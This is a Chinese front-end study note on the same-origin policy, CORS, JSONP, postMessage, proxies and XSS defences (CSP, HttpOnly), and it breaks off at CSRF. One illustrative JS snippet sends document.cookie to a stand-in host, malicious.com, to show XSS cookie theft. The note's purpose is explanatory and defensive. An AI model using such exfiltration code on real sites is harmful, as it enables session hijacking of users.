href="https://time.geekbang.org/column/article/151370?utm_term=zeusQYFJN&amp;utm_source=app&amp;utm_medium=geektime&amp;utm_campaign=216-end&amp;utm_content=v8zhuanlankaipianci0316" target="_blank" rel="noreferrer">参考链接</a></p></blockquote><p>如果浏览器没有安全策略的话，会出现很多不可控的安全问题。</p><p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p><ul><li>修改银行站点的 DOM、CSSOM 等信息；</li><li>在银行站点内部插入 JavaScript 脚本；</li><li>劫持用户登录的用户名和密码；</li><li>读取银行站点的 Cookie、IndexDB 等数据；</li><li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li></ul><p>而浏览器中最基础、最核心的安全策略就是<strong>同源策略</strong></p><h2 id="什么是同源策略" tabindex="-1">什么是同源策略 <a class="header-anchor" href="#什么是同源策略" aria-label="Permalink to &quot;什么是同源策略&quot;">​</a></h2><p>如果两个 URL 的<strong>协议、域名和端口</strong>都相同，我们就称这两个 URL 同源。比如下面两个URL就是同源的</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">https://time.geekbang.org/?category=1</span></span>
<span class="line"><span style="color:#A6ACCD;">https://time.geekbang.org/?category=0</span></span></code></pre></div><p>浏览器默认两个相同的源之间是可以<strong>相互访问资源和操作 DOM</strong> 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为<strong>同源策略</strong>。</p><h2 id="同源策略对dom层面、数据层面、网络层面的影响-跨域问题" tabindex="-1">同源策略对DOM层面、数据层面、网络层面的影响 -- 跨域问题 <a class="header-anchor" href="#同源策略对dom层面、数据层面、网络层面的影响-跨域问题" aria-label="Permalink to &quot;同源策略对DOM层面、数据层面、网络层面的影响 -- 跨域问题&quot;">​</a></h2><p>两个不同源的页面之间会有<strong>跨域问题</strong>，会在 <strong>DOM、Web 数据和网络</strong>这三个层面产生影响。</p><p><strong>1. 同源策略对DOM层面</strong></p><p>同源策略限制了来自<strong>不同源</strong>的 JavaScript 脚本对当前 <code>DOM</code> 对象读和写的操作。</p><p>同源页面间可以互相操作对方的dom。而不同源页面间不可以互相操作对方的dom。</p><p>不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 <code>window.postMessage</code> 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><p><strong>2. 同源策略对数据层面的影响</strong></p><p>同源策略限制了不同源的站点读取当前站点的 <code>Cookie、IndexDB、LocalStorage</code> 等数据。</p><p>由于同源策略，不同源的页面之间不能互相访问对方的 Cookie、IndexDB 或者 LocalStorage 等内容。</p><p><strong>3. 同源策略对网络层面的影响</strong></p><p>同源策略限制了通过 <code>XMLHttpRequest</code> 等方式将站点的数据发送给不同源的站点。</p><h1 id="如何解决跨域问题" tabindex="-1">如何解决跨域问题 <a class="header-anchor" href="#如何解决跨域问题" aria-label="Permalink to &quot;如何解决跨域问题&quot;">​</a></h1><h2 id="cors-跨域资源共享" tabindex="-1">CORS - 跨域资源共享 <a class="header-anchor" href="#cors-跨域资源共享" aria-label="Permalink to &quot;CORS - 跨域资源共享&quot;">​</a></h2><blockquote><p>参考链接: <a href="https://juejin.cn/post/6844903681683357710#heading-4" target="_blank" rel="noreferrer">https://juejin.cn/post/6844903681683357710#heading-4</a></p></blockquote><p><code>CORS</code>（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用<strong>自定义</strong>的 <code>HTTP 头部</code>让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p><img src="/assets/pic1.6750bf6b.png" width="80%/"><ul><li><code>Access-Control-Allow-Credentials</code>：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</li></ul><p><code>CORS</code> 需要<strong>浏览器和服务器</strong>同时支持。目前，所有浏览器都支持该功能。</p><p>整个 CORS 通信过程，都是<strong>浏览器自动完成</strong>，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p><p>因此，实现 CORS 通信的关键是<strong>服务器</strong>。只要服务器实现了 CORS 接口，就可以跨源通信。</p><p>浏览器将CORS请求分成两类：<strong>简单请求</strong>和<strong>非简单请求</strong>。</p><p>只要同时满足以下两大条件，就属于简单请求。</p><ul><li>请求方法是以下三种方法之一： <ol><li>HEAD</li><li>GET</li><li>POST</li></ol></li><li>HTTP的头信息不超出以下几种字段： <ol><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Last-Event-ID</li><li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</li></ol></li></ul><h3 id="简单请求" tabindex="-1">简单请求 <a class="header-anchor" href="#简单请求" aria-label="Permalink to &quot;简单请求&quot;">​</a></h3><ol><li><strong>浏览器</strong>先根据同源策略对前端页面和后台交互地址做匹配， <ul><li>若同源，则直接发送数据请求。</li><li>若不同源，则发送跨域请求，浏览器会在请求的http header中加上一个 <code>Origin</code>字段，标明这个请求是从哪里发出来的。例如：<code>Origin: http://www.wanwan.com</code></li></ul></li><li>服务器解析程序收到浏览器<strong>跨域请求</strong>后，如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息， 如<code>Access-Control-Allow-Origin：http://www.wanwan.com</code>。（如果是公共资源，可回发<code>*</code>）</li><li>浏览器收到服务器的响应后，根据接受到的响应头里的<code>Access-Control-Allow-origin</code>字段与<strong>当前域名</strong>做匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。</li><li>注意，请求和响应都不包含 cookie 信息。</li></ol><p>PS：如果需要包含 <code>cookie</code> 信息，ajax 请求需要设置 xhr 的属性 <code>withCredentials</code> 为 true，服务器需要设置响应头部 <code>Access-Control-Allow-Credentials</code>: true。</p><h3 id="非简单请求" tabindex="-1">非简单请求 <a class="header-anchor" href="#非简单请求" aria-label="Permalink to &quot;非简单请求&quot;">​</a></h3><p>浏览器在发送真正的请求之前，会先发送一个 <code>Preflight 请求(预检请求)</code>给服务器，这种请求使用 <code>OPTIONS</code> 方法。发送下列头部：</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">Origin：与简单的请求相同。</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Request-Method: 请求自身使用的方法。</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</span></span></code></pre></div><p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Origin：与简单的请求相同。</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</span></span>
<span class="line"><span style="color:#A6ACCD;">Access-Control-Max-Age: 应该将这个 Preflight 请求（预检请求）缓存多长时间（以秒表示）。如果在缓存期内，浏览器会使用缓存的预检结果来判断是否发送跨域请求。</span></span></code></pre></div><p>一旦服务器通过 Preflight 请求（预检请求，返回码是<code>204</code>）允许该请求之后，浏览器便可发送真正的请求了，并且以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了（返回码是<code>200</code>）。</p><img src="/assets/pic2.f1b43d6a.png" width="80%/"><h3 id="总结" tabindex="-1">总结 <a class="header-anchor" href="#总结" aria-label="Permalink to &quot;总结&quot;">​</a></h3><p>优点：</p><ol><li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li><li>支持所有类型的 HTTP 请求。</li></ol><p>缺点：</p><ol><li>存在兼容性问题，特别是 IE10 以下的浏览器。</li><li>第一次发送非简单请求时会多一次请求。</li></ol><h3 id="为什么cors要有预检请求呢" tabindex="-1">为什么CORS要有预检请求呢？ <a class="header-anchor" href="#为什么cors要有预检请求呢" aria-label="Permalink to &quot;为什么CORS要有预检请求呢？&quot;">​</a></h3><ul><li><p>减少非简单跨域请求对服务器的影响（开始时就提到，服务器有时候不想理睬跨域请求），比如PUT、DELETE请求可以直接新建或者修改、删除服务器中的资源。预检请求可以防止该情况发生。</p></li><li><p>减少服务器对于是否跨域的计算量。服务器会缓存预检请求的结果，通过<code>Access-Control-Max-Age</code>这个头部信息标明缓存多长时间。而且一次预检请求通过后，之后浏览器发送的请求只要在缓存期内，都只会发正式请求。节约了很多服务端的计算量。</p></li></ul><h2 id="页面中可以嵌入第三方资源-jsonp" tabindex="-1">页面中可以嵌入第三方资源 - JSONP <a class="header-anchor" href="#页面中可以嵌入第三方资源-jsonp" aria-label="Permalink to &quot;页面中可以嵌入第三方资源 - JSONP&quot;">​</a></h2><p>最初的浏览器都是支持外部引用资源文件的。比如用<code>&lt;script&gt;</code>标签引入的js文件(<code>&lt;script&gt;</code>不受同源策略限制)。</p><p>不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p><img src="/assets/pic3.6f9835ca.png" width="60%/"><p>这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的。</p><p>当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p><div class="language-js"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">function</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">onClick</span><span style="color:#89DDFF;">(){</span></span>
<span class="line"><span style="color:#F07178;">  </span><span style="color:#C792EA;">let</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">url</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">=</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">`</span><span style="color:#C3E88D;">http://malicious.com?cookie = </span><span style="color:#89DDFF;">${</span><span style="color:#A6ACCD;">document</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">cookie</span><span style="color:#89DDFF;">}`</span></span>
<span class="line"><span style="color:#F07178;">  </span><span style="color:#82AAFF;">open</span><span style="color:#F07178;">(</span><span style="color:#A6ACCD;">url</span><span style="color:#F07178;">)</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#82AAFF;">onClick</span><span style="color:#A6ACCD;">()</span></span></code></pre></div><p>以上就是一个非常典型的<code> XSS 攻击</code>。</p><p>为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 <code>CSP</code>。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</p><h2 id="postmessage跨域" tabindex="-1">postMessage跨域 <a class="header-anchor" href="#postmessage跨域" aria-label="Permalink to &quot;postMessage跨域&quot;">​</a></h2><p>window.postMessage方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。可以用它来解决 <code>dom 跨域</code>问题。</p><p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p><p>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p><p>例子：</p><p>页面 <code>http://www.A.cn/a.html</code> 的代码：</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">iframe</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">src</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">http://www.A.cn/b.html</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">id</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">myIframe</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">onload</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#82AAFF;">test</span><span style="color:#C3E88D;">()</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">style</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">display: none;</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">// 1. iframe载入 &quot;http://www.A.cn/b.html 页面后会执行该函数</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">function</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">test</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;">// 2. 获取 http://www.A.cn/b.html 页面的 window 对象，</span></span>
<span class="line"><span style="color:#89DDFF;">        </span><span style="color:#676E95;font-style:italic;">// 然后通过 postMessage 向 http://www.A.cn/b.html 页面发送消息</span></span>
<span class="line"><span style="color:#F07178;">        </span><span style="color:#C792EA;">var</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">iframe</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">=</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">document</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getElementById</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">myIframe</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#F07178;">        </span><span style="color:#C792EA;">var</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">win</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">=</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">iframe</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">contentWindow</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#F07178;">        </span><span style="color:#A6ACCD;">win</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">postMessage</span><span style="color:#F07178;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">我是来自 http://www.A.cn/a.html 页面的消息</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">*</span><span style="color:#89DDFF;">&#39;</span><span style="color:#F07178;">)</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span></span></code></pre></div><p>页面 <a href="http://www.A.cn/b.html" target="_blank" rel="noreferrer">http://www.A.cn/b.html</a> 的代码：</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">type</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">text/javascript</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#89DDFF;">    </span><span style="color:#676E95;font-style:italic;">// 注册 message 事件用来接收消息</span></span>
<span class="line"><span style="color:#A6ACCD;">    window</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">onmessage</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">function</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;font-style:italic;">e</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#F07178;">        </span><span style="color:#A6ACCD;">e</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">=</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">e</span><span style="color:#F07178;"> </span><span style="color:#89DDFF;">||</span><span style="color:#F07178;"> </span><span style="color:#A6ACCD;">event</span><span style="color:#89DDFF;">;</span><span style="color:#F07178;"> </span><span style="color:#676E95;font-style:italic;">// 获取事件对象</span></span>
<span class="line"><span style="color:#F07178;">        </span><span style="color:#A6ACCD;">console</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">log</span><span style="color:#F07178;">(</span><span style="color:#A6ACCD;">e</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">data</span><span style="color:#F07178;">)</span><span style="color:#89DDFF;">;</span><span style="color:#F07178;"> </span><span style="color:#676E95;font-style:italic;">// 通过 data 属性得到发送来的消息</span></span>
<span class="line"><span style="color:#F07178;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">script</span><span style="color:#89DDFF;">&gt;</span></span></code></pre></div><h2 id="服务器代理" tabindex="-1">服务器代理 <a class="header-anchor" href="#服务器代理" aria-label="Permalink to &quot;服务器代理&quot;">​</a></h2><p>浏览器有跨域限制，但是<strong>服务器不存在跨域问题</strong>，所以可以由服务器请求所有域的资源再返回给客户端。</p><p>服务器代理是万能的。</p><h1 id="实际开发中如何解决跨域" tabindex="-1">实际开发中如何解决跨域？ <a class="header-anchor" href="#实际开发中如何解决跨域" aria-label="Permalink to &quot;实际开发中如何解决跨域？&quot;">​</a></h1><ol><li><p><code>CORS</code>：比如TCC项目，本地开发时，只需在SwitchHosts中（或whistle-rules中）配置如下规则<code>127.0.0.1 local.tcc.tencent.com</code>，把前端域名local.tcc.tencent.com代理到本地起的前端页面服务中去。关于跨域的问题，都由后台来解决了</p></li><li><p><code>webpack proxy</code>：原理详见 工程化 -《webpack相关面试题》章节。核心：利用<code>http-proxy-middleware</code> 这个http代理中间件（相当于是代理服务器），实现请求转发给其他服务器。因为服务器和服务器之间不存在跨域问题</p><p>比如新商机项目(vite)：</p><div class="language-json"><button title="Copy Code" class="copy"></button><span class="lang">json</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">server: </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">  host</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;</span><span style="color:#F78C6C;">0.0</span><span style="color:#A6ACCD;">.</span><span style="color:#F78C6C;">0.0</span><span style="color:#A6ACCD;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#A6ACCD;">  port</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">3003</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#A6ACCD;">  proxy</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    &#39;/api&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#676E95;font-style:italic;">// 用于开发环境下的转发请求</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#676E95;font-style:italic;">// 更多请参考：https://vitejs.dev/config/#server-proxy</span></span>
<span class="line"><span style="color:#A6ACCD;">      target</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;http:</span><span style="color:#676E95;font-style:italic;">//127.0.0.1:3000&#39;, // 代理到本地node服务</span></span>
<span class="line"><span style="color:#A6ACCD;">      </span><span style="color:#676E95;font-style:italic;">// target: &#39;http://busniess-oppty.testsite.woa.com&#39;, //代理到开发环境node服务</span></span>
<span class="line"><span style="color:#A6ACCD;">      changeOrigin: </span><span style="color:#89DDFF;">true,</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#89DDFF;">}</span><span style="color:#A6ACCD;">,</span></span></code></pre></div></li><li><p>浏览器代理 (工具：Whilst + Switch Omega)：原理与webpack proxy类似</p><p>比如一组运营活动项目，whistle-rules如下：</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;"># ssr页面请求 访问本地前端项目 http协议</span></span>
<span class="line"><span style="color:#A6ACCD;">127.0.0.1:6999 local.qcact.cloud.tencent.cn</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;"># api请求 访问本地node层服务</span></span>
<span class="line"><span style="color:#A6ACCD;">127.0.0.1:6888 local.act-api.cloud.tencent.cn</span></span></code></pre></div></li><li><p>新版Chrome支持本地跨域请求调试</p></li></ol><blockquote><p>PS: 还有一个常用工具：（开发环境切换Host工具：SwitchHosts）</p></blockquote><h1 id="网站攻击及如何防范" tabindex="-1">网站攻击及如何防范 <a class="header-anchor" href="#网站攻击及如何防范" aria-label="Permalink to &quot;网站攻击及如何防范&quot;">​</a></h1><h2 id="xss攻击" tabindex="-1">XSS攻击 <a class="header-anchor" href="#xss攻击" aria-label="Permalink to &quot;XSS攻击&quot;">​</a></h2><blockquote><p>参考链接：<a href="https://time.geekbang.org/column/article/152807?utm_term=zeusQYFJN&amp;utm_source=app&amp;utm_medium=geektime&amp;utm_campaign=216-end&amp;utm_content=v8zhuanlankaipianci0316" target="_blank" rel="noreferrer">https://time.geekbang.org/column/article/152807?utm_term=zeusQYFJN&amp;utm_source=app&amp;utm_medium=geektime&amp;utm_campaign=216-end&amp;utm_content=v8zhuanlankaipianci0316</a></p></blockquote><p><code>XSS</code> 全称是(Cross Site Scripting)，即“跨站脚本”。</p><h3 id="什么是xss攻击" tabindex="-1">什么是XSS攻击 <a class="header-anchor" href="#什么是xss攻击" aria-label="Permalink to &quot;什么是XSS攻击&quot;">​</a></h3><p>XSS 攻击是指黑客往 HTML 文件中或者 DOM 中<strong>注入恶意脚本</strong>，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p><p>开始的时候，这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了。</p><p>而浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容。</p><p>恶意脚本可能会：</p><ol><li>可以<strong>窃取 Cookie 信息</strong>。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li><li>可以<strong>监听用户行为</strong>。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li><li>可以通过<strong>修改 DOM</strong> 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li><li>还可以<strong>在页面内生成浮窗广告</strong>，这些广告会严重地影响用户体验。</li></ol><p>要想避免站点被注入恶意脚本，就要知道有哪些常见的注入方式。通常情况下，主要有<strong>存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击</strong>三种方式来注入恶意脚本。</p><h4 id="存储型xss攻击" tabindex="-1">存储型XSS攻击 <a class="header-anchor" href="#存储型xss攻击" aria-label="Permalink to &quot;存储型XSS攻击&quot;">​</a></h4><p>也叫持久型XSS，主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了。</p><p>产生存储型XSS攻击的原因是没有做好<strong>数据过滤</strong>：前端提交数据至服务端时，没有做好过滤；服务端在接受到数据时，在存储之前，没有做过滤；前端从服务端请求到数据，没有过滤输出。</p><h4 id="反射型-xss-攻击" tabindex="-1">反射型 XSS 攻击 <a class="header-anchor" href="#反射型-xss-攻击" aria-label="Permalink to &quot;反射型 XSS 攻击&quot;">​</a></h4><p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 <code>URL</code>，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的<code>浏览器执行</code>。</p><p><strong>攻击步骤：</strong></p><ol><li>攻击者构造出<code>特殊的 URL</code>，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><h4 id="基于-dom-的-xss-攻击" tabindex="-1">基于 DOM 的 XSS 攻击 <a class="header-anchor" href="#基于-dom-的-xss-攻击" aria-label="Permalink to &quot;基于 DOM 的 XSS 攻击&quot;">​</a></h4><p>黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中<strong>修改 HTML 页面的内容</strong>，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。</p><h3 id="如何防范xss攻击-csp、httponly、" tabindex="-1">如何防范XSS攻击? CSP、HttpOnly、 <a class="header-anchor" href="#如何防范xss攻击-csp、httponly、" aria-label="Permalink to &quot;如何防范XSS攻击? CSP、HttpOnly、&quot;">​</a></h3><p><strong>存储型 XSS 攻击和反射型 XSS 攻击</strong>都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是<strong>服务端</strong>的安全漏洞。</p><p>而<strong>基于 DOM 的 XSS 攻击</strong>全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于<strong>前端</strong>的安全漏洞。</p><p>但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p><ol><li><p><strong>对脚本进行过滤或转码</strong></p></li><li><p>充分利用 <code>CSP</code> 实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p><ul><li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li><li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li><li>禁止执行内联脚本和未授权的脚本；</li><li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li></ul><p>开启CSP的方式有：</p><ul><li>设置 HTTP Header 中的 Content-Security-Policy</li><li>设置 meta 标签的方式</li></ul></li><li><p>使用 <code>HttpOnly</code> 属性：由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。HttpOnly 是<strong>服务器</strong>通过 HTTP <strong>响应头</strong>来设置的， 比如：</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</span></span></code></pre></div><p>使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 js(例如：document.cookie) 来读取这段 Cookie。</p></li></ol><h2 id="csrf攻击" tabindex="-1">CSRF攻击 <a class="header-anchor" href="#csrf攻击" aria-label="Permalink to &quot;CSRF攻击&quot;">​</a></h2><blockquote><p>参考链接：<a 